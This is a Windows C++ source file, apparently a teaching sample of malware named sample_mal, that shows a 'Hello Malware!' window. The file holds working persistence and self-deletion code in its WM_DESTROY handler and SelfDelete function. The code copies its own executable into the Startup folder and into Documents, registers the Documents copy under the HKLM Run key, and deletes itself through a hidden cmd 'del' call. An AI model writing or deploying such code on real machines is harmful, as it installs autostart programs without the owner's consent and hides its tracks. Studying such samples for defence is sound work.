// sample_mal.cpp : 定义程序入口点
//

#include "stdafx.h"
#include "sample_mal.h"

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;								// 当前接口
TCHAR szTitle[MAX_LOADSTRING];					// 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];			// 主窗口类名

// 这里的代码传递包含模块在内的函数声明:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

#include <shlwapi.h>
#include <shlobj.h>
#pragma comment(lib, "shlwapi.lib")
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: 在此插入代码
	MSG msg;
	HACCEL hAccelTable;

	TCHAR szMe[1024];
	TCHAR szPath[1024];

	// file exist?
	GetModuleFileName(NULL, szMe, sizeof(szMe));
	SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
	lstrcat(szPath, "\\0.exe");
	if(lstrcmp(szPath, szMe) != 0){
		if(PathFileExists(szPath)){
			return FALSE;
		}
	}

	// 初始化全局字符串
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_SAMPLE_MAL, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 应用程序初始化:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SAMPLE_MAL));

	// 主消息循环:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目的: 注册窗口类。
//
//  注释:
//
//    这个函数是为了兼容 Windows 95 之前的 Win 32 系统，
//    因为这些版本的系统中没有 'RegisterClassEx' 函数。
//    应用程序要获取正确格式的关联小图标，需要调用这个函数。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SAMPLE_MAL));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_SAMPLE_MAL);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目的: 保存实例句柄，生成主窗口。
//
//   注释:
//
//        这个函数将实例句柄保存到全局变量中，
//        生成并显示应用程序主窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 将实例保存到全局变量中。

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      /*CW_USEDEFAULT*/200, 100, /*CW_USEDEFAULT*/200, 100, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:  处理主窗口消息。
//
//  WM_COMMAND	- 处理应用程序菜单
//  WM_PAINT	- 绘制主窗口
//  WM_DESTROY	- 显示结束消息并返回
//
//
#include <shellapi.h>
BOOL SelfDelete(void)
{
	TCHAR szFile[MAX_PATH];
	TCHAR szCommand[MAX_PATH];
	if(GetModuleFileName(NULL, szFile, MAX_PATH) &&
		GetShortPathName(szFile, szFile, MAX_PATH))
	{
		lstrcpy(szCommand, "/c del ");
		lstrcat(szCommand, szFile);
		lstrcat(szCommand, " >> NUL");
		if(GetEnvironmentVariable(
			"ComSpec", szFile, MAX_PATH) &&
			(INT)ShellExecute(
			0, 0, szFile, szCommand, 0, SW_HIDE) > 32)
		{
			return TRUE;
		}
	}
	return FALSE;
}

BOOL SetRegValue(HKEY root, TCHAR *path, TCHAR *key, TCHAR *data, int len)
{
    HKEY hRegKey;
    DWORD dwDisp;
    BOOL bRet = FALSE;
	hRegKey = NULL;

	if(RegCreateKeyEx(root, path, NULL, "", REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hRegKey, &dwDisp) == ERROR_SUCCESS)
	{
		if (RegSetValueEx(hRegKey, key, 0, REG_SZ,
			(LPBYTE)data, len) == ERROR_SUCCESS)
		{
			bRet = TRUE;
		}
		RegCloseKey(hRegKey);
	}
	return bRet;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	TCHAR szMe[1024];
	TCHAR szPath[1024];
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_CREATE:
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 判断用户点击的菜单:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: 在这里插入绘制窗口的代码...
		TextOut(hdc, 40, 10, "Hello Malware!", 14);
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		// file
		GetModuleFileName(NULL, szMe, sizeof(szMe));
		SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
		lstrcat(szPath, "\\0.exe");
		CopyFile(szMe, szPath, FALSE);
		// reg
		SHGetSpecialFolderPath(NULL, szPath, CSIDL_PERSONAL, FALSE);
		lstrcat(szPath, "\\1.exe");
		CopyFile(szMe, szPath, FALSE);
		SetRegValue(HKEY_LOCAL_MACHINE, 
			"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
			"sample_mal", szPath, strlen(szPath));
		SelfDelete();
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// 版本信息对话框的消息句柄。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
